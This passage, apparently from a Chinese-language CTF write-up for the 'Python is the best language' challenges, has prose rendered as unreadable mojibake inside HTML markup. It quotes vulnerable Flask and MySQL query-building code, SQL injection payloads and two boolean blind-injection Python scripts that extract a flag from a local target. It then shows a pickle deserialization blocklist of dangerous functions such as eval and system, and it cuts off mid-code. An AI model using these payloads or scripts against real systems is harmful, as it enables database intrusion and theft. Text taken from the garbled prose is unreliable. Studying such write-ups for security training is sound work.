class="keyword">in</span> feildname)[:<span class="number">-1</span>] + <span class="string">" "</span></span><br><span class="line">    sql += <span class="string">"from "</span> + tablename + <span class="string">" "</span></span><br><span class="line">    <span class="keyword">if</span> where != &#123;&#125;:</span><br><span class="line">        sql += <span class="string">"where "</span> + <span class="string">""</span>.join(i + <span class="string">" "</span> + where_symbols + <span class="string">" "</span> +</span><br><span class="line">                                  str(where[i]) + <span class="string">" "</span> + l + <span class="string">" "</span> <span class="keyword">for</span> i <span class="keyword">in</span> where)[:<span class="number">-4</span>]</span><br><span class="line">    <span class="keyword">if</span> order != <span class="string">""</span>:</span><br><span class="line">        sql += <span class="string">"order by "</span> + <span class="string">""</span>.join(i + <span class="string">","</span> <span class="keyword">for</span> i <span class="keyword">in</span> order)[:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> sql</span><br></pre></td></tr></table></figure></p><p>æœ€åæ‹¼æ¥å‡ºæ¥çš„sqlè¯­å¥å¦‚ä¸‹ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id from user where email = &apos;your input email&apos;</span><br></pre></td></tr></table></figure></p><p>é‡æ–°çœ‹ä¸€ä¸‹<code>validate_email</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">validate_email</span><span class="params">(self, email)</span>:</span></span><br><span class="line">    user = mysql.One(<span class="string">"user"</span>, &#123;<span class="string">"email"</span>:  <span class="string">"'%s'"</span> % email.data&#125;, [<span class="string">"id"</span>])</span><br><span class="line">    <span class="keyword">if</span> user != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValidationError(<span class="string">'Please use a different email address.'</span>)</span><br></pre></td></tr></table></figure></p><p>æ•°æ®åº“è¯­è¨€è¿”å›æˆåŠŸï¼Œä¼šæç¤º<code>Please use a different email address.</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kira&apos;/**/or/**/1=1#@qq.com</span><br></pre></td></tr></table></figure></p><p>æç¤ºï¼šPlease use a different email address.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kira&apos;/**/or/**/1=0#@qq.com</span><br></pre></td></tr></table></figure><p>ä»€ä¹ˆéƒ½æ²¡è¿”å›</p><p>å¸ƒå°”æ³¨å…¥è„šæœ¬:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://127.0.0.1:30003/register"</span></span><br><span class="line"></span><br><span class="line">r = requests.get(url)</span><br><span class="line">soup = BeautifulSoup(r.text,<span class="string">"html5lib"</span>)</span><br><span class="line">token = soup.find_all(id=<span class="string">'csrf_token'</span>)[<span class="number">0</span>].get(<span class="string">"value"</span>)</span><br><span class="line"></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">"(SELECT/**/GROUP_CONCAT(schema_name)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA)"</span></span><br><span class="line">tables = <span class="string">"(SELECT/**/GROUP_CONCAT(table_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION_SCHEMA.TABLES/**/WHERE/**/TABLE_SCHEMA=DATABASE())"</span></span><br><span class="line">columns = <span class="string">"(SELECT/**/GROUP_CONCAT(column_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/WHERE/**/TABLE_NAME=0x666c616161616167)"</span></span><br><span class="line">flag = <span class="string">"(SELECT/**/GROUP_CONCAT(flllllag/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/flaaaaag)"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        payload = <span class="string">"test'/**/or/**/ascii(substr("</span>+ flag +<span class="string">",%d,1))=%d#@qq.com"</span> % (i,j)</span><br><span class="line">        <span class="keyword">print</span> payload</span><br><span class="line">        post_data = &#123;</span><br><span class="line">            <span class="string">'csrf_token'</span>: token,</span><br><span class="line">            <span class="string">'username'</span>: <span class="string">'a'</span>,</span><br><span class="line">            <span class="string">'email'</span>:payload,</span><br><span class="line">            <span class="string">'password'</span>:<span class="string">'a'</span>,</span><br><span class="line">            <span class="string">'password2'</span>:<span class="string">'a'</span>,</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Register'</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url,data=post_data)</span><br><span class="line">        soup = BeautifulSoup(r.text,<span class="string">"html5lib"</span>)</span><br><span class="line">        token = soup.find_all(id=<span class="string">'csrf_token'</span>)[<span class="number">0</span>].get(<span class="string">"value"</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Please use a different email address."</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            result += chr(j)</span><br><span class="line">            <span class="keyword">print</span> result</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><h3 id="æ³¨å…¥ç‚¹äºŒ"><a href="#æ³¨å…¥ç‚¹äºŒ" class="headerlink" title="æ³¨å…¥ç‚¹äºŒ"></a>æ³¨å…¥ç‚¹äºŒ</h3><p>çœ‹çœ‹<code>routes.py</code>ä¸­ä¿®æ”¹profileä»£ç <br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/edit_profile', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_profile</span><span class="params">()</span>:</span></span><br><span class="line">    form = EditProfileForm(current_user.username)</span><br><span class="line">    <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">        current_user.username = form.username.data</span><br><span class="line">        current_user.note = form.note.data</span><br><span class="line">        res = mysql.Mod(<span class="string">"user"</span>, &#123;<span class="string">"id"</span>: current_user.id&#125;, &#123;</span><br><span class="line">                        <span class="string">"username"</span>: <span class="string">"'%s'"</span> % current_user.username, <span class="string">"note"</span>: <span class="string">"'%s'"</span> % current_user.note&#125;)</span><br><span class="line">        <span class="keyword">if</span> res != <span class="number">0</span>:</span><br><span class="line">            flash(<span class="string">'Your changes have been saved.'</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'edit_profile'</span>))</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        form.username.data = current_user.username</span><br><span class="line">        form.note.data = current_user.note</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'edit_profile.html'</span>, title=<span class="string">'Edit Profile'</span>,</span><br><span class="line">                           form=form)</span><br></pre></td></tr></table></figure></p><p><code>forms.py</code>ä¸­ä¿®æ”¹profileçš„éƒ¨åˆ†<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">validate_note</span><span class="params">(self, note)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> re.match(<span class="string">"^[a-zA-Z0-9_\'\(\) \.\_\*\`\-\@\=\+\&gt;\&lt;]*$"</span>, note.data) == <span class="keyword">None</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValidationError(<span class="string">"Don't input invalid charactors!"</span>)</span><br></pre></td></tr></table></figure></p><p><code>validate_note</code>å¤§éƒ¨åˆ†æ•æ„Ÿå­—ç¬¦éƒ½æ²¡è¿‡æ»¤</p><p>è·Ÿè¿›Modå‡½æ•°<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Mod</span><span class="params">(self, tablemame, where, values)</span>:</span></span><br><span class="line">    sql = <span class="string">"update "</span> + tablemame + <span class="string">" "</span></span><br><span class="line">    sql += <span class="string">"set "</span> + \</span><br><span class="line">        <span class="string">""</span>.join(i + <span class="string">"="</span> + str(values[i]) + <span class="string">","</span> <span class="keyword">for</span> i <span class="keyword">in</span> values)[:<span class="number">-1</span>] + <span class="string">" "</span></span><br><span class="line">    sql += <span class="string">"where "</span> + \</span><br><span class="line">        <span class="string">""</span>.join(i + <span class="string">"="</span> + str(where[i]) + <span class="string">" and "</span> <span class="keyword">for</span> i <span class="keyword">in</span> where)[:<span class="number">-4</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        self.db_session.execute(sql)</span><br><span class="line">        self.db_session.commit()</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure></p><p>æœ€åæ‹¼æ¥å‡ºæ¥çš„sqlè¯­å¥å¦‚ä¸‹ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update user set username=&apos;kira&apos;,note=&apos;your input note&apos; where id=1</span><br></pre></td></tr></table></figure></p><p>æµ‹è¯•å¦‚ä¸‹ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123&apos; and (select flllllag like binary 0x3125 from flaaaaag)  and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure></p><p>About meé‚£é‡Œæ˜¾ç¤º0</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123&apos; and (select flllllag like binary 0x5125 from flaaaaag)  and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p>About meé‚£é‡Œæ˜¾ç¤º1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">cookies = &#123;<span class="string">"session"</span>:<span class="string">"ca823fed-c8b9-450c-8ec9-fc7626ce8326"</span>&#125;</span><br><span class="line">url = <span class="string">"http://127.0.0.1:30003/edit_profile"</span></span><br><span class="line">r = requests.get(url=url,cookies=cookies)</span><br><span class="line">csrf_token_re = <span class="string">r'&lt;input id="csrf_token" name="csrf_token" type="hidden" value="(.*?)"&gt;'</span></span><br><span class="line">csrf_token = re.findall(csrf_token_re, r.content)[<span class="number">0</span>]</span><br><span class="line">note_re = <span class="string">r'&lt;input class="form-control" id="note" name="note" type="text" value="(\d)"&gt;'</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">"0123456789"</span>+string.letters+<span class="string">"!@#$^&amp;*()&#123;&#125;=+`~_"</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"csrf_token"</span>: csrf_token,</span><br><span class="line">            <span class="string">"username"</span>: <span class="string">"kira"</span>,</span><br><span class="line">            <span class="string">"note"</span>: <span class="string">"123' and (select flllllag like binary 0x&#123;&#125;25 from flaaaaag) and '1'='1"</span>.format((flag+j).encode(<span class="string">'hex'</span>)),</span><br><span class="line">            <span class="string">"submit"</span>: <span class="string">"Submit"</span></span><br><span class="line">        &#125;</span><br><span class="line">        r =requests.post(url=url,data=data,cookies=cookies,timeout=<span class="number">2.5</span>)</span><br><span class="line">        note_info = re.findall(note_re, r.content)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> note_info == <span class="string">'1'</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="æ³¨å…¥ç‚¹ä¸‰"><a href="#æ³¨å…¥ç‚¹ä¸‰" class="headerlink" title="æ³¨å…¥ç‚¹ä¸‰"></a>æ³¨å…¥ç‚¹ä¸‰</h3><p>çœ‹çœ‹<code>routes.py</code>ä¸­postå†…å®¹çš„éƒ¨åˆ†<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="meta">@app.route('/index', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    form = PostForm()</span><br><span class="line">    <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">        res = mysql.Add(<span class="string">"post"</span>, [<span class="string">'NULL'</span>, <span class="string">"'%s'"</span> % form.post.data,</span><br><span class="line">                                 <span class="string">"'%s'"</span> % current_user.id, <span class="string">"'%s'"</span> % now()])</span><br><span class="line">        <span class="keyword">if</span> res == <span class="number">1</span>:</span><br><span class="line">            flash(<span class="string">'Your post is now live!'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br></pre></td></tr></table></figure></p><p><code>forms.py</code>ä¸­<code>PostForm()</code>çš„éƒ¨åˆ†<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PostForm</span><span class="params">(FlaskForm)</span>:</span></span><br><span class="line">    post = StringField(<span class="string">'Say something'</span>, validators=[DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">'Submit'</span>)</span><br></pre></td></tr></table></figure></p><p>å•¥è¿‡æ»¤éƒ½æ²¡ï¼<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(self, tablename, values)</span>:</span></span><br><span class="line">    sql = <span class="string">"insert into "</span> + tablename + <span class="string">" "</span></span><br><span class="line">    sql += <span class="string">"values ("</span></span><br><span class="line">    sql += <span class="string">""</span>.join(i + <span class="string">","</span> <span class="keyword">for</span> i <span class="keyword">in</span> values)[:<span class="number">-1</span>]</span><br><span class="line">    sql += <span class="string">")"</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        self.db_session.execute(sql)</span><br><span class="line">        self.db_session.commit()</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure></p><p>æœ€åæ‹¼æ¥å‡ºæ¥çš„sqlè¯­å¥å¦‚ä¸‹ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into post values (NULL,&apos;yout input&apos;,&apos;1&apos;,&apos;2018-04-15&apos;)</span><br></pre></td></tr></table></figure></p><p>æ„é€ payloadï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123&apos;,&apos;1&apos;,&apos;2018-04-15&apos;),(NULL,(select flllllag from flaaaaag),&apos;1&apos;,&apos;2018-04-15&apos;)#</span><br></pre></td></tr></table></figure></p><p>flagå‡ºæ¥äº†ï¼Œé—®é¢˜æ˜¯æ‰€æœ‰äººéƒ½å¯ä»¥çœ‹åˆ°çš„ï¼Œæ¯”èµ›ä¸­ç›´æ¥ç¿»å°±èƒ½çœ‹åˆ°å…¶ä»–äººæ³¨å‡ºæ¥çš„flagï¼Œæ‰€ä»¥åœ¨æ³¨å…¥æ—¶å€™éœ€è¦åŠ å¯†ä¸€ä¸‹ã€‚</p><p>è¿™é‡Œå¯ä»¥ä½¿ç”¨mysqlçš„<code>ENCODE(string,pass),DECODE(string,pass)</code>å‡½æ•°<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span> select hex(encode((select flllllag from flaaaaag),'kirakira'));</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| hex(encode((select flllllag from flaaaaag),'kirakira'))    |</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| 2240079E2A0C151347EF73F32460B6728EB6CDB1DBD8CE227801003C3F |</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span> select decode(unhex('2240079E2A0C151347EF73F32460B6728EB6CDB1DBD8CE227801003C3F'),'kirakira');</span><br><span class="line">+----------------------------------------------------------------------------------------+</span><br><span class="line">| decode(unhex('2240079E2A0C151347EF73F32460B6728EB6CDB1DBD8CE227801003C3F'),'kirakira') |</span><br><span class="line">+----------------------------------------------------------------------------------------+</span><br><span class="line">| QWB&#123;us1ng_val1dator_caut1ous&#125;                                                          |</span><br><span class="line">+----------------------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure></p><h2 id="Python-is-the-best-language2"><a href="#Python-is-the-best-language2" class="headerlink" title="Python is the best language2"></a>Python is the best language2</h2><p>æ¥ç€ä¸‹ä¸€é¢˜ï¼Œåœ¨<code>others.py</code>é‡Œå‘ç°äº†å¥‡æ€ªçš„ä»£ç ï¼š<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pickle <span class="keyword">import</span> Unpickler <span class="keyword">as</span> Unpkler</span><br><span class="line"><span class="keyword">from</span> pickle <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">black_type_list = [eval, execfile, compile, system, open, file, popen, popen2, popen3, popen4, fdopen,</span><br><span class="line">                   tmpfile, fchmod, fchown, pipe, chdir, fchdir, chroot, chmod, chown, link,</span><br><span class="line">                   lchown, listdir, lstat, mkfifo, mknod, mkdir, makedirs, readlink, remove, removedirs,</span><br><span class="line">                   rename, renames, rmdir, tempnam, tmpnam, unlink, walk, execl, execle, execlp, execv,</span><br><span class="line">                   execve, execvp, execvpe, exit, fork, forkpty, kill, nice, spawnl, spawnle, spawnlp, spawnlpe,</span><br><span class="line">                   spawnv, spawnve, spawnvp, spawnvpe, load, loads]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FilterException</span><span class="params">(Exception)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        super(FilterException, self).__init__(</span><br><span class="line">            <span class="string">'the callable object &#123;value&#125; is not allowed'</span>.format(value=str(value)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_hook_call</span><span class="params">(func)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">print</span> args[<span class="number">0</span>].stack</span><br><span class="line">        <span class="keyword">if</span> args[<span class="number">0</span>].stack[<span class="number">-2</span>] <span class="keyword">in</span> black_type_list:</span><br><span class="line">            <span class="keyword">raise</span> FilterException(args[<span class="number">0</span>].stack[<span class="number">-2</span>])</span><br><span class="line">        <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load</span><span class="params">(file)</span>:</span></span><br><span class="line">    unpkler = Unpkler(file)</span><br><span class="line">    unpkler.dispatch[REDUCE] = _hook_call(unpkler.dispatch[REDUCE])</span><br><span class="line">    <span class="keyword">return</span> Unpkler(file).load()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loads</span><span class="params">(str)</span>:</span></span><br><span class="line">    file = StringIO(str)</span><br><span class="line">    unpkler = Unpkler(file)</span><br><span class="line">    unpkler.dispatch[REDUCE] = _hook_call(unpkler.dispatch[REDUCE])</span><br><span class="line">    <span class="keyword">return</span> unpkler.load()</span><br></pre></td></tr></table></figure></p><p>è¿™é‡Œå­˜åœ¨ååºåˆ—åŒ–æ¼æ´ä»¥åŠåŸºæœ¬çš„æ²™ç®±é€ƒé€¸é—®é¢˜ã€‚</p><h3 id="pickleåºåˆ—åŒ–"><a href="#pickleåºåˆ—åŒ–" class="headerlink" title="pickleåºåˆ—åŒ–"></a>pickleåºåˆ—åŒ–</h3><p>Pythonæä¾›ä¸¤ä¸ªæ¨¡å—æ¥å®ç°åºåˆ—åŒ–ï¼š<code>cPickle</code>å’Œ<code>pickle</code>ã€‚è¿™ä¸¤ä¸ªæ¨¡å—åŠŸèƒ½æ˜¯ä¸€æ ·çš„ï¼ŒåŒºåˆ«åœ¨äº<code>cPickle</code>æ˜¯Cè¯­è¨€å†™çš„ï¼Œé€Ÿåº¦å¿«ï¼Œ<code>pickle</code>æ˜¯çº¯Pythonå†™çš„ï¼Œé€Ÿåº¦æ…¢ã€‚</p><p><code>pickle</code>æ¨¡å—æä¾›çš„ç›¸å…³å‡½æ•°<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å°†æŒ‡å®šçš„Pythonå¯¹è±¡é€šè¿‡pickleåºåˆ—åŒ–ä½œä¸ºbyteså¯¹è±¡è¿”å›ï¼Œè€Œä¸æ˜¯å°†å…¶å†™å…¥æ–‡ä»¶</span></span><br><span class="line">dumps(obj, protocol=<span class="keyword">None</span>, *, fix_imports=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†é€šè¿‡pickleåºåˆ—åŒ–åå¾—åˆ°çš„å­—èŠ‚å¯¹è±¡è¿›è¡Œååºåˆ—åŒ–ï¼Œè½¬æ¢ä¸ºPythonå¯¹è±¡å¹¶è¿”å›</span></span><br><span class="line">loads(bytes_object, *, fix_imports=<span class="keyword">True</span>, encoding=<span class="string">"ASCII"</span>, errors=<span class="string">"strict"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†æŒ‡å®šçš„Pythonå¯¹è±¡é€šè¿‡pickleåºåˆ—åŒ–åå†™å…¥æ‰“å¼€çš„æ–‡ä»¶å¯¹è±¡ä¸­ï¼Œç­‰ä»·äº`Pickler(file, protocol).dump(obj)`</span></span><br><span class="line">dump(obj, file, protocol=<span class="keyword">None</span>, *, fix_imports=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä»æ‰“å¼€çš„æ–‡ä»¶å¯¹è±¡ä¸­è¯»å–pickledå¯¹è±¡è¡¨ç°å½¢å¼å¹¶è¿”å›é€šè¿‡pickleååºåˆ—åŒ–åå¾—åˆ°çš„Pythonå¯¹è±¡</span></span><br><span class="line">load(file, *, fix_imports=<span class="keyword">True</span>, encoding=<span class="string">"ASCII"</span>, errors=<span class="string">"strict"</span>)</span><br></pre></td></tr></table></figure></p><blockquote><p>è¯´æ˜ï¼š ä¸Šé¢è¿™å‡ ä¸ªæ–¹æ³•å‚æ•°ä¸­ï¼Œ*å·åé¢çš„å‚æ•°éƒ½æ˜¯Python 3.xæ–°å¢çš„ï¼Œç›®çš„æ˜¯ä¸ºäº†å…¼å®¹Python 2.xï¼Œå…·ä½“ç”¨æ³•è¯·å‚çœ‹å®˜æ–¹æ–‡æ¡£ã€‚</p></blockquote><p>åŸºæœ¬ä½¿ç”¨æ–¹æ³•ï¼š<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">P = pickle.Pickler(file) <span class="comment">#pickle.dump(object, file)</span></span><br><span class="line">P.dump(object)</span><br><span class="line"></span><br><span class="line">U = pickle.Unpickler(file) <span class="comment">#pickle.load(file)</span></span><br><span class="line">object = U.load()</span><br></pre></td></tr></table></figure></p><h3 id="pickleååºåˆ—åŒ–æ¼æ´"><a href="#pickleååºåˆ—åŒ–æ¼æ´" class="headerlink" title="pickleååºåˆ—åŒ–æ¼æ´"></a>pickleååºåˆ—åŒ–æ¼æ´</h3><p>pythonçš„ååºåˆ—åŒ–æ¼æ´å…³é”®åœ¨äº<strong>reduce</strong> é­”æœ¯æ–¹æ³•ï¼Œåœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¼šå®Œå…¨æ”¹å˜è¢«åºåˆ—åŒ–çš„å¯¹è±¡ã€‚è¿™ä¸ªæ–¹æ³•è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²æˆ–è€…å…ƒç»„æ¥æè¿°å½“ååºåˆ—åŒ–çš„æ—¶å€™è¯¥å¦‚ä½•é‡æ„ï¼Œè¿›è€Œé€ æˆå‘½ä»¤æ‰§è¡Œã€‚<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span 